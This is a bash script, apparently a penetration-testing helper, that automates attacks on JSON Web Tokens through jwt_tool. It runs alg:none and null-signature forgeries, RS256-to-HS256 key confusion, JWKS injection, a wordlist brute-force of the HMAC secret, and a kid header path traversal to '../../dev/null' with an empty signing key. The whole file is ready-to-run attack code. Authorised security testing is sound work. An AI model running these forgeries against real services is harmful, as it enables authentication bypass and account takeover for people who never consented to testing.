#!/usr/bin/env bash
set -euo pipefail
JWT="${1:?Usage: $0 <jwt_token> [public_key_file]}"
PUBKEY="${2:-}"
TS=$(date +%Y%m%d-%H%M%S); OUT="reports/raw/jwt-$TS"; mkdir -p "$OUT"
JT="jwt_tool"
command -v jwt_tool &>/dev/null || JT="python3 /opt/jwt_tool/jwt_tool.py"

echo "===== JWT Analysis Suite ====="
echo "[*] Decoding..."
$JT "$JWT" 2>/dev/null | tee "$OUT/decode.txt" || true

echo "[*] alg:none (CVE-2015-9235)..."
$JT "$JWT" -X a 2>/dev/null | tee "$OUT/alg-none.txt" || true

echo "[*] Null signature (CVE-2020-28042)..."
$JT "$JWT" -X n 2>/dev/null | tee "$OUT/null-sig.txt" || true

echo "[*] Blank password..."
$JT "$JWT" -X b 2>/dev/null | tee "$OUT/blank-pass.txt" || true

[ -n "$PUBKEY" ] && [ -f "$PUBKEY" ] && {
  echo "[*] Key confusion RS256->HS256 (CVE-2016-5431)..."
  $JT "$JWT" -X k -pk "$PUBKEY" 2>/dev/null | tee "$OUT/key-confusion.txt" || true
}

echo "[*] JWKS injection (CVE-2018-0114)..."
$JT "$JWT" -X i 2>/dev/null | tee "$OUT/jwks-inject.txt" || true

echo "[*] Brute-force HMAC secret..."
[ -f wordlists/jwt-secrets.txt ] && $JT "$JWT" -C -d wordlists/jwt-secrets.txt 2>/dev/null | tee "$OUT/crack.txt" || true

echo "[*] kid header path traversal..."
$JT "$JWT" -I -hc kid -hv "../../dev/null" -S hs256 -p "" 2>/dev/null | tee "$OUT/kid-traversal.txt" || true

echo "===== JWT Analysis Complete: $OUT/ ====="
